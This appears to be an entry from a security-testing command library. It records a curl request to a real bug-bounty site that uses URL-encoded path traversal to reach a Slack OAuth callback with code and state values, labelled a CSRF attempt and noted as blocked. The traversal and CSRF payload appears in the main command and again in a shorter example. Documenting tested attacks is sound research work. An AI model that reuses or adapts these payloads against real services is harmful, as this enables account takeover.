---
id: cmd-004
data: >-
  curl -X GET
  "https://hackerone.com/bugs?subject=anontest5667&report_id=..%2F..%2F..%2Fauth%2Fslack%2Fcallback%3Fcode%3D14582397537.14583911921.010c282773%26state%3Dc802bcef4532f0122d0f06088a2eaea890d746f0cb4d39b2%3F&view=new&substates%5B%5D=new&text_query=&sort_type=latest_activity&sort_direction=descending&limit=25&page=1"
  -H "Cookie: your_session_cookie"
tags:
  - csrf
  - oauth
type: command
output: null
executor: curl
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:30.166Z'
verified: false
validated: true
submitted: true
---
# slack-oauth-callback-attempt

## Command

```bash
curl -X GET "https://hackerone.com/bugs?subject=anontest5667&report_id=..%2F..%2F..%2Fauth%2Fslack%2Fcallback%3Fcode%3D14582397537.14583911921.010c282773%26state%3Dc802bcef4532f0122d0f06088a2eaea890d746f0cb4d39b2%3F&view=new&substates%5B%5D=new&text_query=&sort_type=latest_activity&sort_direction=descending&limit=25&page=1" -H "Cookie: your_session_cookie"
```

## Description

Attempts CSRF on Slack OAuth callback via traversal, but blocked by .json.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `report_id` | Traversal to callback with code/state | Yes |
| `code` | OAuth code | Yes |
| `state` | State token | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://hackerone.com/bugs?report_id=../../../auth/slack/callback?code=abc" -H "Cookie: ..."
```

## Expected Output

302 to /auth/failure due to param blocking.

## Related

- [[commands/json-suffix-bypass]]
- [[procedures/Attempt-CSRF-on-Slack-OAuth-Callback]]
